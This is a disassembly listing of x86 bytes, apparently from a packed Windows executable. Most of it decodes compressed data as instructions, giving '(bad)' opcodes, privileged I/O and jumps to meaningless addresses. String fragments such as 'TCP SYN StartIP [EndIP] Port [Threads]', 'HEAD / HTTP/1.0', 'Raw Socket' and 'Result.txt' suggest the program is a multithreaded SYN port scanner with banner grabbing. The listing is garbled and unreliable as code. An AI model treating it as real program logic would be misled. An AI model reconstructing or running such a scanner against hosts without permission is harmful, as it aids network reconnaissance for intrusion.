  4091b2:	c1 8c 5a cc d9 19 ac 	rorl   $0xec,-0x53e62634(%edx,%ebx,2)
  4091b9:	ec 
  4091ba:	b2 38                	mov    $0x38,%dl
  4091bc:	97                   	xchg   %eax,%edi
  4091bd:	49                   	dec    %ecx
  4091be:	44                   	inc    %esp
  4091bf:	d9 0b                	(bad) (%ebx)
  4091c1:	08 1c ac             	or     %bl,(%esp,%ebp,4)
  4091c4:	3d 0b 40 17 62       	cmp    $0x6217400b,%eax
  4091c9:	89 6c e4 21          	mov    %ebp,0x21(%esp,%eiz,8)
  4091cd:	24 1d                	and    $0x1d,%al
  4091cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d0:	2a 9b 5c 20 4e 3f    	sub    0x3f4e205c(%ebx),%bl
  4091d6:	10 0e                	adc    %cl,(%esi)
  4091d8:	84 70 65             	test   %dh,0x65(%eax)
  4091db:	6e                   	outsb  %ds:(%esi),(%dx)
  4091dc:	27                   	daa
  4091dd:	38 96 c3 d8 40 c9    	cmp    %dl,-0x36bf273d(%esi)
  4091e3:	a3 ae 6e f7 9b       	mov    %eax,0x9bf76eae
  4091e8:	91                   	xchg   %eax,%ecx
  4091e9:	21 a3 51 68 ac b7    	and    %esp,-0x485397af(%ebx)
  4091ef:	73 d2                	jae    0x4091c3
  4091f1:	bd 8d 5e 06 68       	mov    $0x68065e8d,%ebp
  4091f6:	6c                   	insb   (%dx),%es:(%edi)
  4091f7:	98                   	cwtl
  4091f8:	41                   	inc    %ecx
  4091f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4091fa:	20 ec                	and    %ch,%ah
  4091fc:	5c                   	pop    %esp
  4091fd:	20 57 48             	and    %dl,0x48(%edi)
  409200:	32 62 04             	xor    0x4(%edx),%ah
  409203:	f6 8a 6f a4 4a 07 02 	testb  $0x2,0x74aa46f(%edx)
  40920a:	c8 e6 15 d3          	enter  $0x15e6,$0xd3
  40920e:	6f                   	outsl  %ds:(%esi),(%dx)
  40920f:	ff 48 c4             	decl   -0x3c(%eax)
  409212:	92                   	xchg   %eax,%edx
  409213:	55                   	push   %ebp
  409214:	88 0e                	mov    %cl,(%esi)
  409216:	0a 03                	or     (%ebx),%al
  409218:	18 32                	sbb    %dh,(%edx)
  40921a:	76 b8                	jbe    0x4091d4
  40921c:	1a ff                	sbb    %bh,%bh
  40921e:	7a af                	jp     0x4091cf
  409220:	44                   	inc    %esp
  409221:	52                   	push   %edx
  409222:	24 c1                	and    $0xc1,%al
  409224:	9c                   	pushf
  409225:	2a 4e 11             	sub    0x11(%esi),%cl
  409228:	83 54 5e c6 60       	adcl   $0x60,-0x3a(%esi,%ebx,2)
  40922d:	59                   	pop    %ecx
  40922e:	f1                   	int1
  40922f:	c0 91 27 70 08 63 31 	rclb   $0x31,0x63087027(%ecx)
  409236:	82 a7 26 04 cb 0b 05 	andb   $0x5,0xbcb0426(%edi)
  40923d:	87 2c 87             	xchg   %ebp,(%edi,%eax,4)
  409240:	2c 35                	sub    $0x35,%al
  409242:	06                   	push   %es
  409243:	29 07                	sub    %eax,(%edi)
  409245:	87 2c 87             	xchg   %ebp,(%edi,%eax,4)
  409248:	2c 1d                	sub    $0x1d,%al
  40924a:	08 11                	or     %dl,(%ecx)
  40924c:	09 3c 23             	or     %edi,(%ebx,%eiz,1)
  40924f:	3a 59 ca             	cmp    -0x36(%ecx),%bl
  409252:	3c cd                	cmp    $0xcd,%al
  409254:	8c 26                	mov    %fs,(%esi)
  409256:	11 e4                	adc    %esp,%esp
  409258:	07                   	pop    %es
  409259:	34 48                	xor    $0x48,%al
  40925b:	07                   	pop    %es
  40925c:	5c                   	pop    %esp
  40925d:	e7 14                	out    %eax,$0x14
  40925f:	03 18                	add    (%eax),%ebx
  409261:	f9                   	stc
  409262:	66 70 80             	data16 jo 0x4091e5
  409265:	50                   	push   %eax
  409266:	d7                   	xlat   %ds:(%ebx)
  409267:	19 64 ed c4          	sbb    %esp,-0x3c(%ebp,%ebp,8)
  40926b:	4c                   	dec    %esp
  40926c:	c1 23 42             	shll   $0x42,(%ebx)
  40926f:	58                   	pop    %eax
  409270:	39 03                	cmp    %eax,(%ebx)
  409272:	f0 83 14 91 03       	lock adcl $0x3,(%ecx,%edx,4)
  409277:	0f 8f 6e 01 ef e1    	jg     0xe22f93eb
  40927d:	01 9a e4 39 e2 e4    	add    %ebx,-0x1b1dc61c(%edx)
  409283:	92                   	xchg   %eax,%edx
  409284:	f4                   	hlt
  409285:	9c                   	pushf
  409286:	6f                   	outsl  %ds:(%esi),(%dx)
  409287:	29 fa                	sub    %edi,%edx
  409289:	50                   	push   %eax
  40928a:	de 4d 0c             	fimuls 0xc(%ebp)
  40928d:	c5 4d c8             	lds    -0x38(%ebp),%ecx
  409290:	60                   	pusha
  409291:	4b                   	dec    %ebx
  409292:	a8 42                	test   $0x42,%al
  409294:	e1 63                	loope  0x4092f9
  409296:	89 65 bf             	mov    %esp,-0x41(%ebp)
  409299:	c3                   	ret
  40929a:	ec                   	in     (%dx),%al
  40929b:	3a 1e                	cmp    (%esi),%bl
  40929d:	4f                   	dec    %edi
  40929e:	7c 0f                	jl     0x4092af
  4092a0:	3b 30                	cmp    (%eax),%esi
  4092a2:	3b 32                	cmp    (%edx),%esi
  4092a4:	c8 14 32 53          	enter  $0x3214,$0x53
  4092a8:	5a                   	pop    %edx
  4092a9:	04 20                	add    $0x20,%al
  4092ab:	53                   	push   %ebx
  4092ac:	c8 14 5b a1          	enter  $0x5b14,$0xa1
  4092b0:	45                   	inc    %ebp
  4092b1:	0a 19                	or     (%ecx),%bl
  4092b3:	2c 46                	sub    $0x46,%al
  4092b5:	30 1c 0c             	xor    %bl,(%esp,%ecx,1)
  4092b8:	d8 48 9c             	fmuls  -0x64(%eax)
  4092bb:	64 4c                	fs dec %esp
  4092bd:	6c                   	insb   (%dx),%es:(%edi)
  4092be:	9e                   	sahf
  4092bf:	b5 91                	mov    $0x91,%ch
  4092c1:	74 cb                	je     0x40928e
  4092c3:	4f                   	dec    %edi
  4092c4:	34 2b                	xor    $0x2b,%al
  4092c6:	28 d1                	sub    %dl,%cl
  4092c8:	32 a8 01 ac 7c 84    	xor    -0x7b8353ff(%eax),%ch
  4092ce:	c5 8a 5c 3f 45 37    	lds    0x37453f5c(%edx),%ecx
  4092d4:	10 8b 81 f0 26 b8    	adc    %cl,-0x47d90f7f(%ebx)
  4092da:	67 e4 a0             	addr16 in $0xa0,%al
  4092dd:	94                   	xchg   %eax,%esp
  4092de:	e5 21                	in     $0x21,%eax
  4092e0:	f6 a1 e6 89 58 d7    	mulb   -0x28a7761a(%ecx)
  4092e6:	f8                   	clc
  4092e7:	fa                   	cli
  4092e8:	62 cd 41             	(bad) {%k5}
  4092eb:	2d 07 0f 1e 73       	sub    $0x731e0f07,%eax
  4092f0:	cb                   	lret
  4092f1:	b7 13                	mov    $0x13,%bh
  4092f3:	60                   	pusha
  4092f4:	82 2f 05             	subb   $0x5,(%edi)
  4092f7:	c1 08 8b             	rorl   $0x8b,(%eax)
  4092fa:	55                   	push   %ebp
  4092fb:	c2 8c c6             	ret    $0xc68c
  4092fe:	ba 80 0c 0f 7e       	mov    $0x7e0f0c80,%edx
  409303:	a2 02 74 06 68       	mov    %al,0x68067402
  409308:	02 de                	add    %dh,%bl
  40930a:	ab                   	stos   %eax,%es:(%edi)
  40930b:	99                   	cltd
  40930c:	00 1e                	add    %bl,(%esi)
  40930e:	6c                   	insb   (%dx),%es:(%edi)
  40930f:	30 f9                	xor    %bh,%cl
  409311:	ca 1e ef             	lret   $0xef1e
  409314:	39 8d 22 70 66 2e    	cmp    %ecx,0x2e667022(%ebp)
  40931a:	21 46 26             	and    %eax,0x26(%esi)
  40931d:	1a 43 56             	sbb    0x56(%ebx),%al
  409320:	99                   	cltd
  409321:	fb                   	sti
  409322:	d8 01                	fadds  (%ecx)
  409324:	ec                   	in     (%dx),%al
  409325:	14 10                	adc    $0x10,%al
  409327:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40932a:	2e 5c                	cs pop %esp
  40932c:	43                   	inc    %ebx
  40932d:	b2 99                	mov    $0x99,%dl
  40932f:	2d 59 e8 5f ec       	sub    $0xec5fe859,%eax
  409334:	1d d9 87 1c 60       	sbb    $0x601c87d9,%eax
  409339:	42                   	inc    %edx
  40933a:	e4 e0                	in     $0xe0,%al
  40933c:	b9 84 77 56 36       	mov    $0x36567784,%ecx
  409341:	b2 bd                	mov    $0xbd,%dl
  409343:	48                   	dec    %eax
  409344:	42                   	inc    %edx
  409345:	e0 e4                	loopne 0x40932b
  409347:	a2 1f 3b e4 ca       	mov    %al,0xcae43b1f
  40934c:	42                   	inc    %edx
  40934d:	dc d8                	(bad)
  40934f:	17                   	pop    %ss
  409350:	14 89                	adc    $0x89,%al
  409352:	55                   	push   %ebp
  409353:	d4 8c                	aam    $0x8c
  409355:	8d 6c ee 8b          	lea    -0x75(%esi,%ebp,8),%ebp
  409359:	11 52 48             	adc    %edx,0x48(%edx)
  40935c:	45                   	inc    %ebp
  40935d:	d4 d8                	aam    $0xd8
  40935f:	4b                   	dec    %ebx
  409360:	dc 18                	fcompl (%eax)
  409362:	69 b0 91 50 f8 3b c6 	imul   $0x3d8f19c6,0x3bf85091(%eax),%esi
  409369:	19 8f 3d 
  40936c:	9d                   	popf
  40936d:	d3 38                	sarl   %cl,(%eax)
  40936f:	f7 08 06 74 95 e8    	testl  $0xe8957406,(%eax)
  409375:	76 5e                	jbe    0x4093d5
  409377:	46                   	inc    %esi
  409378:	70 74                	jo     0x4093ee
  40937a:	fd                   	std
  40937b:	3c ad                	cmp    $0xad,%al
  40937d:	0c 06                	or     $0x6,%al
  40937f:	4b                   	dec    %ebx
  409380:	09 0f                	or     %ecx,(%edi)
  409382:	c8 b8 86 a3          	enter  $0x86b8,$0xa3
  409386:	1a e3                	sbb    %bl,%ah
  409388:	10 cb                	adc    %cl,%bl
  40938a:	9e                   	sahf
  40938b:	e0 95                	loopne 0x409322
  40938d:	44                   	inc    %esp
  40938e:	00 2c 1a             	add    %ch,(%edx,%ebx,1)
  409391:	01 bd a8 25 fc 1f    	add    %edi,0x1ffc25a8(%ebp)
  409397:	26 9d                	es popf
  409399:	9d                   	popf
  40939a:	cf                   	iret
  40939b:	b5 3d                	mov    $0x3d,%ch
  40939d:	5d                   	pop    %ebp
  40939e:	65 e4 81             	gs in  $0x81,%al
  4093a1:	93                   	xchg   %eax,%ebx
  4093a2:	b1 3a                	mov    $0x3a,%cl
  4093a4:	fb                   	sti
  4093a5:	78 7c                	js     0x409423
  4093a7:	15 03 2b 01 e6       	adc    $0xe6012b03,%eax
  4093ac:	f7 75 ac             	divl   -0x54(%ebp)
  4093af:	84 6d c0             	test   %ch,-0x40(%ebp)
  4093b2:	71 e8                	jno    0x40939c
  4093b4:	c4 05 15 c8 19 29    	les    0x2919c815,%eax
  4093ba:	28 10                	sub    %dl,(%eax)
  4093bc:	e9 04 c8 66 7e       	jmp    0x7ea75bc5
  4093c1:	cd 90                	int    $0x90
  4093c3:	58                   	pop    %eax
  4093c4:	0f ec 40 8c          	paddsb -0x74(%eax),%mm0
  4093c8:	2d 5e c2 c3 01       	sub    $0x1c3c25e,%eax
  4093cd:	dc 64 01 15          	fsubl  0x15(%ecx,%eax,1)
  4093d1:	39 1f                	cmp    %ebx,(%edi)
  4093d3:	19 cc                	sbb    %ecx,%esp
  4093d5:	8c 39                	mov    %?,(%ecx)
  4093d7:	b6 73                	mov    $0x73,%dh
  4093d9:	94                   	xchg   %eax,%esp
  4093da:	a1 04 d8 ab 34       	mov    0x34abd804,%eax
  4093df:	d8 3d 4d e1 e4 0a    	fdivrs 0xae4e14d
  4093e5:	c3                   	ret
  4093e6:	8e c0                	mov    %eax,%es
  4093e8:	ca 0c 95             	lret   $0x950c
  4093eb:	fc                   	cld
  4093ec:	67 c0 bb 16 90 fc    	sarb   $0xfc,-0x6fea(%bp,%di)
  4093f2:	5e                   	pop    %esi
  4093f3:	58                   	pop    %eax
  4093f4:	87 2c 24             	xchg   %ebp,(%esp)
  4093f7:	55                   	push   %ebp
  4093f8:	ef                   	out    %eax,(%dx)
  4093f9:	0d e0 bf 8b 24       	or     $0x248bbfe0,%eax
  4093fe:	04 51                	add    $0x51,%al
  409400:	89 e9                	mov    %ebp,%ecx
  409402:	81 e9 00 3f 85 01    	sub    $0x1853f00,%ecx
  409408:	2d 06 75 e1 db       	sub    $0xdbe17506,%eax
  40940d:	bf 3d 04 7d ec       	mov    $0xec7d043d,%edi
  409412:	29 c1                	sub    %eax,%ecx
  409414:	0f 89 e0 89 cc 42    	jns    0x430d1dfa
  40941a:	ff 60 cc             	jmp    *-0x34(%eax)
  40941d:	5a                   	pop    %edx
  40941e:	7b d8                	jnp    0x4093f8
  409420:	e0 ec                	loopne 0x40940e
  409422:	c3                   	ret
  409423:	25 18 44 01 09       	and    $0x9014418,%eax
  409428:	76 37                	jbe    0x409461
  40942a:	63 23                	arpl   %esp,(%ebx)
  40942c:	35 1c 7b 9c c3       	xor    $0xc39c7b1c,%eax
  409431:	8b 65 0a             	mov    0xa(%ebp),%esp
  409434:	18 2a                	sbb    %ch,(%edx)
  409436:	fb                   	sti
  409437:	e0 c6                	loopne 0x4093ff
  409439:	00 7a a4             	add    %bh,-0x5c(%edx)
  40943c:	5f                   	pop    %edi
  40943d:	6f                   	outsl  %ds:(%esi),(%dx)
  40943e:	2a 4e 83             	sub    -0x7d(%esi),%cl
  409441:	6a 2d                	push   $0x2d
  409443:	ba 6e 3f 03 e9       	mov    $0xe9033f6e,%edx
  409448:	13 ac 2b 6d 10 25 1c 	adc    0x1c25106d(%ebx,%ebp,1),%ebp
  40944f:	97                   	xchg   %eax,%edi
  409450:	b4 44                	mov    $0x44,%ah
  409452:	24 31                	and    $0x31,%al
  409454:	ec                   	in     (%dx),%al
  409455:	e6 b6                	out    %al,$0xb6
  409457:	09 6f c7             	or     %ebp,-0x39(%edi)
  40945a:	04 64                	add    $0x64,%al
  40945c:	a1 70 cc 5c 23       	mov    0x235ccc70,%eax
  409461:	07                   	pop    %es
  409462:	df ed                	fucomip %st(5),%st
  409464:	37                   	aaa
  409465:	f2 0c b8             	repnz or $0xb8,%al
  409468:	50                   	push   %eax
  409469:	10 1d 14 8d 17 64    	adc    %bl,0x64178d14
  40946f:	a3 20 5d 41 3e       	mov    %eax,0x3e415d20
  409474:	b7 7b                	mov    $0x7b,%bh
  409476:	ad                   	lods   %ds:(%esi),%eax
  409477:	4f                   	dec    %edi
  409478:	25 28 d1 07 88       	and    $0x8807d128,%eax
  40947d:	06                   	push   %es
  40947e:	19 64 b0 2c          	sbb    %esp,0x2c(%eax,%esi,4)
  409482:	0f e4 30             	pmulhuw (%eax),%mm6
  409485:	34 19                	xor    $0x19,%al
  409487:	64 90                	fs nop
  409489:	41                   	inc    %ecx
  40948a:	38 3c 40             	cmp    %bh,(%eax,%eax,2)
  40948d:	c9                   	leave
  40948e:	b3 43                	mov    $0x43,%bl
  409490:	06                   	push   %es
  409491:	44                   	inc    %esp
  409492:	72 07                	jb     0x40949b
  409494:	e8 71 83 0c 32       	call   0x324d180a
  409499:	c8 ec f0 f4          	enter  $0xf0ec,$0xf4
  40949d:	8c 0c 36             	mov    %cs,(%esi,%esi,1)
  4094a0:	c8 20 90 94          	enter  $0x9020,$0x94
  4094a4:	87 f8                	xchg   %edi,%eax
  4094a6:	f2 e4 20             	repnz in $0x20,%al
  4094a9:	83 fc 00             	cmp    $0x0,%esp
  4094ac:	72 04                	jb     0x4094b2
  4094ae:	72 83                	jb     0x409433
  4094b0:	9c                   	pushf
  4094b1:	3c 79                	cmp    $0x79,%al
  4094b3:	08 72 0c             	or     %dh,0xc(%edx)
  4094b6:	72 48                	jb     0x409500
  4094b8:	4c                   	dec    %esp
  4094b9:	0c 32                	or     $0x32,%al
  4094bb:	c8 20 50 10          	enter  $0x5020,$0x10
  4094bf:	98                   	cwtl
  4094c0:	c8 c9 93 83          	enter  $0x93c9,$0x83
  4094c4:	14 72                	adc    $0x72,%al
  4094c6:	18 72 54             	sbb    %dh,0x54(%edx)
  4094c9:	20 83 0c 32 9c a0    	and    %al,-0x5f63cdf4(%ebx)
  4094cf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4094d0:	06                   	push   %es
  4094d1:	39 39                	cmp    %edi,(%ecx)
  4094d3:	c8 a8 1c 72          	enter  $0x1ca8,$0x72
  4094d7:	20 24 39             	and    %ah,(%ecx,%edi,1)
  4094da:	64 90                	fs nop
  4094dc:	41                   	inc    %ecx
  4094dd:	28 2c 72             	sub    %ch,(%edx,%esi,2)
  4094e0:	64 10 4e 06          	adc    %cl,%fs:0x6(%esi)
  4094e4:	72 ac                	jb     0x409492
  4094e6:	57                   	push   %edi
  4094e7:	58                   	pop    %eax
  4094e8:	21 27                	and    %esp,(%edi)
  4094ea:	07                   	pop    %es
  4094eb:	19 5c 30 72          	sbb    %ebx,0x72(%eax,%esi,1)
  4094ef:	b0 19                	mov    $0x19,%al
  4094f1:	e4 e4                	in     $0xe4,%al
  4094f3:	d9 72 07             	fnstenv 0x7(%edx)
  4094f6:	60                   	pusha
  4094f7:	71 64                	jno    0x40955d
  4094f9:	68 64 90 41 06       	push   $0x6419064
  4094fe:	6c                   	insb   (%dx),%es:(%edi)
  4094ff:	70 74                	jo     0x409575
  409501:	41                   	inc    %ecx
  409502:	4e                   	dec    %esi
  409503:	9e                   	sahf
  409504:	1c 38                	sbb    $0x38,%al
  409506:	72 78                	jb     0x409580
  409508:	71 7c                	jno    0x409586
  40950a:	06                   	push   %es
  40950b:	19 64 90 b4          	sbb    %esp,-0x4c(%eax,%edx,4)
  40950f:	80 b8 bc 19 64 90 41 	cmpb   $0x41,-0x6f9be644(%eax)
  409516:	cc                   	int3
  409517:	d0 d4                	rcl    $1,%ah
  409519:	91                   	xchg   %eax,%ecx
  40951a:	99                   	cltd
  40951b:	41                   	inc    %ecx
  40951c:	06                   	push   %es
  40951d:	d8 dc                	fcomp  %st(4)
  40951f:	00 aa 8c 55 10 00    	add    %ch,0x10558c(%edx)
  409525:	7f 81                	jg     0x4094a8
  409527:	9a a3 03 10 0b 52 65 	lcall  $0x6552,$0xb1003a3
  40952e:	73 75                	jae    0x4095a5
  409530:	6c                   	insb   (%dx),%es:(%edi)
  409531:	74 b6                	je     0x4094e9
  409533:	fd                   	std
  409534:	ff                   	(bad)
  409535:	ff 2e                	ljmp   *(%esi)
  409537:	74 78                	je     0x4095b1
  409539:	74 00                	je     0x40953b
  40953b:	48                   	dec    %eax
  40953c:	45                   	inc    %ebp
  40953d:	41                   	inc    %ecx
  40953e:	44                   	inc    %esp
  40953f:	20 2f                	and    %ch,(%edi)
  409541:	20 48 54             	and    %cl,0x54(%eax)
  409544:	54                   	push   %esp
  409545:	50                   	push   %eax
  409546:	2f                   	das
  409547:	31 2e                	xor    %ebp,(%esi)
  409549:	30 0d 0a 01 00 00    	xor    %cl,0x10a
  40954f:	ff f6                	push   %esi
  409551:	cb                   	lret
  409552:	3f                   	aas
  409553:	55                   	push   %ebp
  409554:	73 61                	jae    0x4095b7
  409556:	67 65 3a 20          	cmp    %gs:(%bx,%si),%ah
  40955a:	25 73 20 54 43       	and    $0x43542073,%eax
  40955f:	1c 53                	sbb    $0x53,%al
  409561:	59                   	pop    %ecx
  409562:	4e                   	dec    %esi
  409563:	20 53 74             	and    %dl,0x74(%ebx)
  409566:	61                   	popa
  409567:	df da                	(bad)
  409569:	b7 ff                	mov    $0xff,%bh
  40956b:	72 74                	jb     0x4095e1
  40956d:	49                   	dec    %ecx
  40956e:	50                   	push   %eax
  40956f:	20 5b 45             	and    %bl,0x45(%ebx)
  409572:	6e                   	outsb  %ds:(%esi),(%dx)
  409573:	64 06                	fs push %es
  409575:	5d                   	pop    %ebp
  409576:	20 50 6f             	and    %dl,0x6f(%eax)
  409579:	0e                   	push   %cs
  40957a:	1d 5b 54 68 72       	sbb    $0x7268545b,%eax
  40957f:	fb                   	sti
  409580:	ff                   	(bad)
  409581:	fe                   	(bad)
  409582:	f6 65 61             	mulb   0x61(%ebp)
  409585:	64 73 0f             	fs jae 0x409597
  409588:	5b                   	pop    %ebx
  409589:	2f                   	das
  40958a:	54                   	push   %esp
  40958b:	28 4e 29             	sub    %cl,0x29(%esi)
  40958e:	07                   	pop    %es
  40958f:	28 48 29             	sub    %cl,0x29(%eax)
  409592:	42                   	inc    %edx
  409593:	61                   	popa
  409594:	6e                   	outsb  %ds:(%esi),(%dx)
  409595:	6e                   	outsb  %ds:(%esi),(%dx)
  409596:	65 72 0c             	gs jb  0x4095a5
  409599:	cf                   	iret
  40959a:	dc df                	(bad)
  40959c:	fe                   	(bad)
  40959d:	53                   	push   %ebx
  40959e:	61                   	popa
  40959f:	76 65                	jbe    0x409606
  4095a1:	5d                   	pop    %ebp
  4095a2:	56                   	push   %esi
  4095a3:	45                   	inc    %ebp
  4095a4:	78 61                	js     0x409607
  4095a6:	6d                   	insl   (%dx),%es:(%edi)
  4095a7:	70 6c                	jo     0x409615
  4095a9:	53                   	push   %ebx
  4095aa:	51                   	push   %ecx
  4095ab:	20 31                	and    %dh,(%ecx)
  4095ad:	f6 bf 6c d8 32 2e    	idivb  0x2e32d86c(%edi)
  4095b3:	02 0b                	add    (%ebx),%cl
  4095b5:	32 35 34 20 38 30    	xor    0x30382034,%dh
  4095bb:	20 35 0a 42 61 27    	and    %dh,0x2761420a
  4095c1:	b2 30                	mov    $0x30,%dl
  4095c3:	2f                   	das
  4095c4:	32 26                	xor    (%esi),%ah
  4095c6:	4b                   	dec    %ebx
  4095c7:	85 c5                	test   %eax,%ebp
  4095c9:	de e3                	fsubp  %st,%st(3)
  4095cb:	54                   	push   %esp
  4095cc:	38 20                	cmp    %ah,(%eax)
  4095ce:	89 88 36 e4 40 d8    	mov    %ecx,-0x27bf1bca(%eax)
  4095d4:	6c                   	insb   (%dx),%es:(%edi)
  4095d5:	48                   	dec    %eax
  4095d6:	cb                   	lret
  4095d7:	39 32                	cmp    %esi,(%edx)
  4095d9:	31 f6                	xor    %esi,%esi
  4095db:	fe 04 d8             	incb   (%eax,%ebx,8)
  4095de:	38 2d 36 35 35 33    	cmp    %ch,0x33353536
  4095e4:	35 cc 61 2a fb       	xor    $0xfb2a61cc,%eax
  4095e9:	3f                   	aas
  4095ea:	11 2c 33             	adc    %ebp,(%ebx,%esi,1)
  4095ed:	33 38                	xor    (%eax),%edi
  4095ef:	39 2c 35 36 33 31 3a 	cmp    %ebp,0x3a313336(,%esi,1)
  4095f6:	24 1c                	and    $0x1c,%al
  4095f8:	16                   	push   %ss
  4095f9:	d9 2d db 04 b0 59    	fldcw  0x59b004db
  4095ff:	28 0b                	sub    %cl,(%ebx)
  409601:	2c be                	sub    $0xbe,%al
  409603:	51                   	push   %ecx
  409604:	b2 58                	mov    $0x58,%dl
  409606:	73 81                	jae    0x409589
  409608:	8c 54 8f 34          	mov    %ss,0x34(%edi,%ecx,4)
  40960c:	b6 ff                	mov    $0xff,%dh
  40960e:	81 2d 27 43 54 52 4c 	subl   $0x20432b4c,0x52544327
  409615:	2b 43 20 
  409618:	49                   	dec    %ecx
  409619:	25 50 6c 29 ec       	and    $0xec296c50,%eax
  40961e:	37                   	aaa
  40961f:	6c                   	insb   (%dx),%es:(%edi)
  409620:	73 73                	jae    0x409695
  409622:	65 64 20 00          	gs and %al,%fs:(%eax)
  409626:	2c 50                	sub    $0x50,%al
  409628:	df 85 6f 2c 72 66    	filds  0x66722c6f(%ebp)
  40962e:	9a 6d 69 6e 67 08 69 	lcall  $0x6908,$0x676e696d
  409635:	6d                   	insl   (%dx),%es:(%edi)
  409636:	5c                   	pop    %esp
  409637:	64 ff 47 96          	incl   %fs:-0x6a(%edi)
  40963b:	b1 2f                	mov    $0x2f,%cl
  40963d:	02 20                	add    (%eax),%ah
  40963f:	3a 20                	cmp    (%eax),%ah
  409641:	2d 2d 3e 20 00       	sub    $0x203e2d,%eax
  409646:	53                   	push   %ebx
  409647:	65 72 76             	gs jb  0x4096c0
  40964a:	db b0 6d 2b 1e 00    	(bad) 0x1e2b6d(%eax)
  409650:	10 2e                	adc    %ch,(%esi)
  409652:	02 0b                	add    (%ebx),%cl
  409654:	2d 6d 9b db da       	sub    $0xdadb9b6d,%eax
  409659:	31 36                	xor    %esi,(%esi)
  40965b:	65 05 35 24 23 22    	gs add $0x22232435,%eax
  409661:	97                   	xchg   %eax,%edi
  409662:	22 47 b6             	and    -0x4a(%edi),%al
  409665:	b2 84                	mov    $0x84,%dl
  409667:	5b                   	pop    %ebx
  409668:	1e                   	push   %ds
  409669:	13 4e bd             	adc    -0x43(%esi),%ecx
  40966c:	5f                   	pop    %edi
  40966d:	60                   	pusha
  40966e:	ef                   	out    %eax,(%dx)
  40966f:	55                   	push   %ebp
  409670:	4c                   	dec    %esp
  409671:	4c                   	dec    %esp
  409672:	2f                   	das
  409673:	34 4f                	xor    $0x4f,%al
  409675:	70 65                	jo     0x4096dc
  409677:	6e                   	outsb  %ds:(%esi),(%dx)
  409678:	1d d9 01 36 91       	sbb    $0x913601d9,%eax
  40967d:	52                   	push   %edx
  40967e:	0d 53 0d 47 c7       	or     $0xc7470d53,%eax
  409683:	41                   	inc    %ecx
  409684:	fa                   	cli
  409685:	16                   	push   %ss
  409686:	1e                   	push   %ds
  409687:	75 92                	jne    0x40961b
  409689:	53                   	push   %ebx
  40968a:	63 77 99             	arpl   %esi,-0x67(%edi)
  40968d:	de c2                	faddp  %st,%st(2)
  40968f:	b6 ce                	mov    $0xce,%dh
  409691:	20 21                	and    %ah,(%ecx)
  409693:	20 be 42 a2 2c 90    	and    %bh,-0x6fd35dbe(%esi)
  409699:	1d 3e 44 87 43       	sbb    $0x4387443e,%eax
  40969e:	ec                   	in     (%dx),%al
  40969f:	03 4c 61 73          	add    0x73(%ecx,%eiz,2),%ecx
  4096a3:	74 28                	je     0x4096cd
  4096a5:	d8 6f 6c             	fsubrs 0x6c(%edi)
  4096a8:	d9 4b 09             	(bad) 0x9(%ebx)
  4096ab:	a3 21 4c 26 23       	mov    %eax,0x23264c21
  4096b0:	84 59 17             	test   %bl,0x17(%ecx)
  4096b3:	c3                   	ret
  4096b4:	2c 01                	sub    $0x1,%al
  4096b6:	92                   	xchg   %eax,%edx
  4096b7:	0f 10 16             	movups (%esi),%xmm2
  4096ba:	09 3e                	or     %edi,(%esi)
  4096bc:	14 46                	adc    $0x46,%al
  4096be:	61                   	popa
  4096bf:	7e db                	jle    0x40969c
  4096c1:	f5                   	cmc
  4096c2:	c6                   	(bad)
  4096c3:	69 6c 06 6f 20 43 a4 	imul   $0x74a44320,0x6f(%esi,%eax,1),%ebp
  4096ca:	74 
  4096cb:	65 70 6f             	gs jo  0x40973d
  4096ce:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4096d1:	74 9f                	je     0x409672
  4096d3:	b2 8d                	mov    $0x8d,%dl
  4096d5:	cb                   	lret
  4096d6:	16                   	push   %ss
  4096d7:	42                   	inc    %edx
  4096d8:	25 64 14 49 6e       	and    $0x6e491464,%eax
  4096dd:	69 74 b7 a6 8e 24 96 	imul   $0x96248e,-0x5a(%edi,%esi,4),%esi
  4096e4:	00 
  4096e5:	4f                   	dec    %edi
  4096e6:	00 14 76             	add    %dl,(%esi,%esi,2)
  4096e9:	61                   	popa
  4096ea:	3f                   	aas
  4096eb:	6b 5b ec 6c          	imul   $0x6c,-0x14(%ebx),%ebx
  4096ef:	69 64 b2 24 79 6a 1a 	imul   $0x4d1a6a79,0x24(%edx,%esi,4),%esp
  4096f6:	4d 
  4096f7:	61                   	popa
  4096f8:	78 20                	js     0x40971a
  4096fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4096fb:	b7 6d                	mov    $0x6d,%bh
  4096fd:	02 01                	add    (%ecx),%al
  4096ff:	7e 75                	jle    0x409776
  409701:	35 4f 66 52 6f       	xor    $0x6f52664f,%eax
  409706:	75 f8                	jne    0x409700
  409708:	ee                   	out    %al,(%dx)
  409709:	2c d6                	sub    $0xd6,%al
  40970b:	53                   	push   %ebx
  40970c:	1c 2b                	sbb    $0x2b,%al
  40970e:	43                   	inc    %ebx
  40970f:	03 4f 6e             	add    0x6e(%edi),%ecx
  409712:	6c                   	insb   (%dx),%es:(%edi)
  409713:	79 20                	jns    0x409735
  409715:	df 6e 77             	fildll 0x77(%esi)
  409718:	c1 97 0c 20 57 49 1c 	rcll   $0x1c,0x4957200c(%edi)
  40971f:	32 4b 09             	xor    0x9(%ebx),%cl
  409722:	72 20                	jb     0x409744
  409724:	41                   	inc    %ecx
  409725:	62 85 87 b9 af 6f    	bound  %eax,0x6fafb987(%ebp)
  40972b:	94                   	xchg   %eax,%esp
  40972c:	2d f3 61 48 6f       	sub    $0x6f4861f3,%eax
  409731:	1b 6d 6b             	sbb    0x6b(%ebp),%ebp
  409734:	ef                   	out    %eax,(%dx)
  409735:	bd 73 87 3e 1a       	mov    $0x1a3e8773,%ebp
  40973a:	01 8c 6d 8b 9b 73 ee 	add    %ecx,-0x118c6475(%ebp,%ebp,2)
  409741:	8f 68 d1 57          	(bad)
  409745:	72 6f                	jb     0x4097b6
  409747:	05 35 6c 77 65       	add    $0x65776c35,%eax
  40974c:	f6 86 bd 09 b2 24 3d 	testb  $0x3d,0x24b209bd(%esi)
  409753:	10 3c 6c             	adc    %bh,(%esp,%ebp,2)
  409756:	f7 85 5d 2c 17 4c 69 	testl  $0x4ed27369,0x4c172c5d(%ebp)
  40975d:	73 d2 4e 
  409760:	6f                   	outsl  %ds:(%esi),(%dx)
  409761:	25 23 61 81 85       	and    $0x85816123,%eax
  409766:	3b 3a                	cmp    (%edx),%edi
